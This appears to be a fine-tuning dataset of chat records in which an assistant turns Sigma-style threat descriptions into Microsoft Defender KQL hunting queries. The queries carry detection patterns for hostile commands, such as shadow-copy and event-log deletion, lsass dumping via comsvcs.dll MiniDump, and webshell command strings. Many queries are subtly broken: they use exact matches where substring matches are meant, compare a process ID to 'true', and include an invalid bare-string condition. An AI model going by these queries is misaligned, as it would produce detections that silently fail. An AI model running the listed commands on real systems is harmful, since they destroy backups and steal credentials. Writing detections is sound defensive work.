{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new PowerShell module \".psm1\", \".psd1\", \".dll\", \".ps1\", etc. by a non-PowerShell process Topic: file_event_win_powershell_module_uncommon_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\WindowsPowerShell\\\\Modules\\\\\", \"\\\\PowerShell\\\\7\\\\Modules\\\\\")) and (not((InitiatingProcessFolderPath in~ (\":\\\\Program Files\\\\PowerShell\\\\7-preview\\\\pwsh.exe\", \":\\\\Program Files\\\\PowerShell\\\\7\\\\pwsh.exe\", \":\\\\Windows\\\\System32\\\\poqexec.exe\", \":\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe\", \":\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \":\\\\Windows\\\\SysWOW64\\\\poqexec.exe\", \":\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe\", \":\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55) Topic: file_event_win_uac_bypass_msconfig_gui"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\pkgmgr.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"git\" in order to clone a remote repository that contain suspicious keywords which might be suspicious Topic: proc_creation_lnx_susp_git_clone"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \" clone \" and InitiatingProcessFolderPath =~ \"/git\") and (ProcessCommandLine in~ (\"exploit\", \"Vulns\", \"vulnerability\", \"RCE\", \"RemoteCodeExecution\", \"Invoke-\", \"CVE-\", \"poc-\", \"ProofOfConcept\", \"proxyshell\", \"log4shell\", \"eternalblue\", \"eternal-blue\", \"MS17-\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "When configured with suitable command line arguments, w32tm can act as a delay mechanism Topic: proc_creation_win_w32tm"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/stripchart\", \"/computer:\", \"/period:\", \"/dataonly\", \"/samples:\")) and (FolderPath endswith \"\\\\w32tm.exe\" or ProcessVersionInfoOriginalFileName =~ \"w32time.dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker register a new SIP provider for persistence and defense evasion Topic: registry_set_sip_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\Providers*\" or RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\OID\\\\EncodingType\" or RegistryKey endswith \"\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Cryptography\\\\Providers*\" or RegistryKey contains \"\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Cryptography\\\\OID\\\\EncodingType\") and (RegistryKey contains \"\\\\Dll\" or RegistryKey contains \"\\\\$DLL\")) and (not(((RegistryValueData in~ (\"WINTRUST.DLL\", \"mso.dll\")) or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\poqexec.exe\" and RegistryKey contains \"\\\\CryptSIPDll\" and RegistryValueData =~ \"C:\\\\Windows\\\\System32\\\\PsfSip.dll\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a file with an \".rdp\" extension by an application that doesnt commonly create such files.\n Topic: file_event_win_rdp_file_susp_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".rdp\" and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\CCleaner Browser\\\\Application\\\\CCleanerBrowser.exe\", \"\\\\chromium.exe\", \"\\\\firefox.exe\", \"\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"\\\\iexplore.exe\", \"\\\\microsoftedge.exe\", \"\\\\msedge.exe\", \"\\\\Opera.exe\", \"\\\\Vivaldi.exe\", \"\\\\Whale.exe\", \"\\\\olk.exe\", \"\\\\Outlook.exe\", \"\\\\RuntimeBroker.exe\", \"\\\\Thunderbird.exe\", \"\\\\Discord.exe\", \"\\\\Keybase.exe\", \"\\\\msteams.exe\", \"\\\\Slack.exe\", \"\\\\teams.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible execution via LNK file accessed on a WebDAV server. Topic: proc_creation_win_webdav_lnk_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\explorer.exe\" and ProcessCommandLine =~ \"\\\\DavWWWRoot\\\\\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by IMEWDBLD.EXE. This might indicate potential abuse of the utility as a LOLBIN in order to download arbitrary files or additional payloads.\n Topic: net_connection_win_imewdbld"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\IMEWDBLD.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects processes loading the non-existent DLL \"ShellChromeAPI\". One known example is the \"DeviceEnroller\" binary in combination with the \"PhoneDeepLink\" flag tries to load this DLL.\nAdversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\n Topic: image_load_side_load_shell_chrome_api"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\ShellChromeAPI.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641 Topic: proc_creation_win_exploit_cve_2015_1641"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\WINWORD.EXE\" and InitiatingProcessFolderPath =~ \"\\\\MicroScMgmt.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Shadow Copies deletion using operating systems utilities Topic: proc_creation_win_susp_shadow_copies_deletion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"shadow\", \"delete\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\wmic.exe\" or FolderPath endswith \"\\\\vssadmin.exe\" or FolderPath endswith \"\\\\diskshadow.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\", \"wmic.exe\", \"VSSADMIN.EXE\", \"diskshadow.exe\")))) or ((ProcessCommandLine in~ (\"delete\", \"catalog\", \"quiet\")) and (FolderPath endswith \"\\\\wbadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"WBADMIN.EXE\")) or ((ProcessCommandLine in~ (\"unbounded\", \"/MaxSize=\")) and (FolderPath endswith \"\\\\vssadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"VSSADMIN.EXE\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"esxcli\" command with the \"vm\" and \"kill\" flag in order to kill/shutdown a specific VM. Topic: proc_creation_lnx_esxcli_vm_kill"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"vm process\", \"kill\")) and InitiatingProcessFolderPath =~ \"/esxcli\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the clearing or configuration tampering of EventLog using utilities such as \"wevtutil\", \"powershell\" and \"wmic\".\nThis technique were seen used by threat actors and ransomware strains in order to evade defenses.\n Topic: proc_creation_win_susp_eventlog_clear"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine in~ (\"Clear-EventLog \", \"Remove-EventLog \", \"Limit-EventLog \", \"Clear-WinEvent \")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) or (ProcessCommandLine =~ \"ClearEventLog\" and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wmic.exe\"))) or ((ProcessCommandLine in~ (\"clear-log \", \" cl \", \"set-log \", \" sl \", \"lfn:\")) and InitiatingProcessFolderPath =~ \"\\\\wevtutil.exe\")) and (not(((InitiatingProcessFileName in~ (\"C:\\\\Windows\\\\SysWOW64\\\\msiexec.exe\", \"C:\\\\Windows\\\\System32\\\\msiexec.exe\")) and ProcessCommandLine =~ \" sl \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the invocation of PowerShell commands with references to classes from the \"System.Security.Cryptography\" namespace.\nThe PowerShell namespace \"System.Security.Cryptography\" provides classes for on-the-fly encryption and decryption.\nThese can be used for example in decrypting malicious payload for defense evasion.\n Topic: proc_creation_win_powershell_crypto_namespace"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".AesCryptoServiceProvider\", \".DESCryptoServiceProvider\", \".DSACryptoServiceProvider\", \".RC2CryptoServiceProvider\", \".Rijndael\", \".RSACryptoServiceProvider\", \".TripleDESCryptoServiceProvider\")) and ProcessCommandLine =~ \"System.Security.Cryptography.\" and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects netsh commands that turns off the Windows firewall Topic: proc_creation_win_netsh_fw_disable"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\") and ((ProcessCommandLine in~ (\"firewall\", \"set\", \"opmode\", \"disable\")) or (ProcessCommandLine in~ (\"advfirewall\", \"set\", \"state\", \"off\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when the \"index\" value of a scheduled task is removed or deleted from the registry. Which effectively hides it from any tooling such as \"schtasks /query\" Topic: registry_delete_schtasks_hide_task_via_index_value_removal"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType in~ (\"RegistryKeyDeleted\", \"RegistryValueDeleted\")) and (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree*\" and RegistryKey contains \"Index\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential commandline obfuscation using unicode characters.\nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.\n Topic: proc_creation_win_susp_cli_obfuscation_unicode_img"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessVersionInfoOriginalFileName in~ (\"Cmd.EXE\", \"cscript.exe\", \"PowerShell.EXE\", \"pwsh.dll\", \"wscript.exe\")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\"))) and (ProcessCommandLine in~ (\"\u02e3\", \"\u02ea\", \"\u02e2\", \"\u2215\", \"\u2044\", \"\u2015\", \"\u2014\", \"\u00a0\", \"\u00af\", \"\u00ae\", \"\u00b6\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects patterns found in process executions cause by China Chopper like tiny (ASPX) webshells Topic: proc_creation_win_webshell_chopper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"&ipconfig&echo\", \"&quser&echo\", \"&whoami&echo\", \"&c:&echo\", \"&cd&echo\", \"&dir&echo\", \"&echo [E]\", \"&echo [S]\")) and (FolderPath endswith \"\\\\w3wp.exe\" or InitiatingProcessFolderPath endswith \"\\\\w3wp.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects active directory enumeration activity using known AdFind CLI flags Topic: proc_creation_win_pua_adfind_enumeration"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"-sc admincountdmp\" or ProcessCommandLine =~ \"-sc exchaddresses\" or (ProcessCommandLine in~ (\"lockoutduration\", \"lockoutthreshold\", \"lockoutobservationwindow\", \"maxpwdage\", \"minpwdage\", \"minpwdlength\", \"pwdhistorylength\", \"pwdproperties\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Topic: proc_creation_win_lolbin_syncappvpublishingserver_execute_psh"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\\\"n; \" and (FolderPath endswith \"\\\\SyncAppvPublishingServer.exe\" or ProcessVersionInfoOriginalFileName =~ \"syncappvpublishingserver.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file named \"dllhost.exe\" in the \"C:\\users\\public\\Documents\\\" directory. Seen being used by the COLDSTEEL RAT in some of its variants. Topic: file_event_win_malware_coldsteel_renamed_cmd"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\users\\\\public\\\\Documents\\\\dllhost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities Topic: proc_creation_win_winzip_password_compression"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -min \", \" -a \")) and ProcessCommandLine =~ \"-s\\\"\" and (ProcessCommandLine in~ (\"winzip.exe\", \"winzip64.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a schtask via PowerSploit or Empire Default Configuration. Topic: proc_creation_win_hktl_powersploit_empire_default_schtasks"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and (ProcessCommandLine in~ (\"/SC ONLOGON\", \"/SC DAILY /ST\", \"/SC ONIDLE\", \"/SC HOURLY\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects commandline operations on shell history files Topic: proc_creation_macos_susp_histfile_operations"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\".bash_history\", \".zsh_history\", \".zhistory\", \".history\", \".sh_history\", \"fish_history\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Windows Installer service (msiexec.exe) spawning \"cmd\" or \"powershell\" Topic: proc_creation_win_susp_elavated_msi_spawned_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"PowerShell.EXE\", \"pwsh.dll\"))) and InitiatingProcessFileName =~ \"tmp\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential sideloading of \"mpclient.dll\" by Windows Defender processes (\"MpCmdRun\" and \"NisSrv\") from their non-default directory. Topic: proc_creation_win_mpcmdrun_dll_sideload_defender"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\MpCmdRun.exe\", \"\\\\NisSrv.exe\")) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Windows Defender\\\\\", \"C:\\\\Program Files\\\\Microsoft Security Client\\\\\", \"C:\\\\Program Files\\\\Windows Defender\\\\\", \"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of system DLLs that are usually not present on the system (or at least not in system directories).\nUsually this technique is used to achieve DLL hijacking.\n Topic: file_event_win_create_non_existent_dlls"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\":\\\\Windows\\\\System32\\\\TSMSISrv.dll\", \":\\\\Windows\\\\System32\\\\TSVIPSrv.dll\", \":\\\\Windows\\\\System32\\\\wbem\\\\wbemcomn.dll\", \":\\\\Windows\\\\System32\\\\WLBSCTRL.dll\", \":\\\\Windows\\\\System32\\\\wow64log.dll\", \":\\\\Windows\\\\System32\\\\WptsExtensions.dll\", \"\\\\SprintCSP.dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and Windows eventlogs are cleared using wevtutil Topic: proc_creation_win_malware_notpetya"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where \"\\\\perfc.dat\" or ((ProcessCommandLine endswith \".dat,#1\" or ProcessCommandLine endswith \".dat #1\" or ProcessCommandLine endswith \".zip.dll\\\",#1\") and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\") or (ProcessCommandLine in~ (\"wevtutil cl Application & fsutil usn deletejournal /D C:\", \"dllhost.dat %WINDIR%\\\\ransoms\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of the file \"rootlog\" which is used by the TripleCross rootkit as a way to check if the backdoor is already running. Topic: file_event_lnx_triple_cross_rootkit_lock_file"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"/tmp/rootlog\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of DLL side-loading malware used by threat group Emissary Panda aka APT27 Topic: proc_creation_win_apt_apt27_emissary_panda"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\sllauncher.exe\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\") or (InitiatingProcessFileName =~ \"\\\\AppData\\\\Roaming\\\\\" and ProcessCommandLine =~ \"-k\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of \".xml\" and \".txt\" files in folders of the \"\\AppData\\Roaming\\Microsoft\" directory by uncommon processes. This behavior was seen common across different Devil Bait samples and stages as described by the NCSC Topic: file_event_win_malware_devil_bait_script_drop"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".txt\", \".xml\")) and (InitiatingProcessFolderPath in~ (\"\\\\schtasks.exe\", \"\\\\wscript.exe\", \"\\\\mshta.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia Topic: proc_creation_win_apt_tropictrooper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"schtasks.exe\" from a parent that is located in a potentially suspicious location.\nMultiple malware strains were seen exhibiting a similar behavior in order to achieve persistence.\n Topic: proc_creation_win_schtasks_creation_from_susp_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\":\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\\", \"\\\\AppData\\\\Roaming\\\\\", \"\\\\Temporary Internet\", \"\\\\Users\\\\Public\\\\\", \"\\\\Windows\\\\Temp\\\\\")) and ProcessCommandLine =~ \"/Create \" and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") and (not((ProcessCommandLine in~ (\"update_task.xml\", \"unattended.ini\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when the AllowMultipleTSSessions value is enabled.\nWhich allows for multiple Remote Desktop connection sessions to be opened at once.\nThis is often used by attacker as a way to connect to an RDP session without disconnecting the other users\n Topic: registry_set_winlogon_allow_multiple_tssessions"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\AllowMultipleTSSessions\" and RegistryValueData endswith \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects executables located in potentially suspicious directories initiating network connections towards file sharing domains. Topic: net_connection_win_susp_file_sharing_domains_susp_folders"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (RemoteUrl in~ (\".githubusercontent.com\", \"anonfiles.com\", \"cdn.discordapp.com\", \"ddns.net\", \"dl.dropboxusercontent.com\", \"ghostbin.co\", \"glitch.me\", \"gofile.io\", \"hastebin.com\", \"mediafire.com\", \"mega.co.nz\", \"mega.nz\", \"onrender.com\", \"pages.dev\", \"paste.ee\", \"pastebin.com\", \"pastebin.pl\", \"pastetext.net\", \"pixeldrain.com\", \"privatlab.com\", \"privatlab.net\", \"send.exploit.in\", \"sendspace.com\", \"storage.googleapis.com\", \"storjshare.io\", \"supabase.co\", \"temp.sh\", \"transfer.sh\", \"trycloudflare.com\", \"ufile.io\", \"w3spaces.com\", \"workers.dev\"))) and (InitiatingProcessFolderPath contains \":\\\\$Recycle.bin\" or InitiatingProcessFolderPath contains \":\\\\Perflogs\\\\\" or InitiatingProcessFolderPath contains \":\\\\Temp\\\\\" or InitiatingProcessFolderPath contains \":\\\\Users\\\\Default\\\\\" or InitiatingProcessFolderPath contains \":\\\\Users\\\\Public\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Fonts\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\IME\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\System32\\\\Tasks\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Tasks\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Temp\\\\\" or InitiatingProcessFolderPath contains \"\\\\AppData\\\\Temp\\\\\" or InitiatingProcessFolderPath contains \"\\\\config\\\\systemprofile\\\\\" or InitiatingProcessFolderPath contains \"\\\\Windows\\\\addins\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report. Topic: proc_creation_lnx_ssm_agent_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-register \", \"-code \", \"-id \", \"-region \")) and InitiatingProcessFolderPath =~ \"/amazon-ssm-agent\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line. Topic: proc_creation_win_hktl_cobaltstrike_load_by_rundll32"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine endswith \" StartW\" or ProcessCommandLine endswith \",StartW\") and ProcessCommandLine =~ \".dll\") and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\" or (ProcessCommandLine contains \"rundll32.exe\" or ProcessCommandLine contains \"rundll32 \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a user manipulates with Firmward Password on MacOS. NOTE - this command has been disabled on silicon-based apple computers. Topic: proc_creation_macos_susp_macos_firmware_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath =~ \"/usr/sbin/firmwarepasswd\" and (ProcessCommandLine in~ (\"setpasswd\", \"full\", \"delete\", \"check\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Hides the file extension through modification of the registry Topic: registry_set_change_security_zones"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\Domains*\" and (not((RegistryValueData in~ (\"DWORD (0x00000000)\", \"DWORD (0x00000001)\", \"(Empty)\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon outbound network activity via Kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.\n Topic: net_connection_win_susp_outbound_kerberos_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and RemotePort == 88) and (not(InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\lsass.exe\")) and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Mozilla Firefox\\\\firefox.exe\", \"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\")) or InitiatingProcessFolderPath =~ \"\\\\tomcat\\\\bin\\\\tomcat8.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious process patterns found in logs when CrackMapExec is used Topic: proc_creation_win_hktl_crackmapexec_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and (ProcessCommandLine in~ (\"cmd.exe /c \", \"cmd.exe /r \", \"cmd.exe /k \", \"cmd /c \", \"cmd /r \", \"cmd /k \"))) or (ProcessCommandLine in~ (\"do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump\", \"\\\\Windows\\\\Temp\\\\\", \" full\", \"%%B\")) or (ProcessCommandLine in~ (\"tasklist /v /fo csv\", \"findstr /i \\\"lsass\\\"\"))"}]}
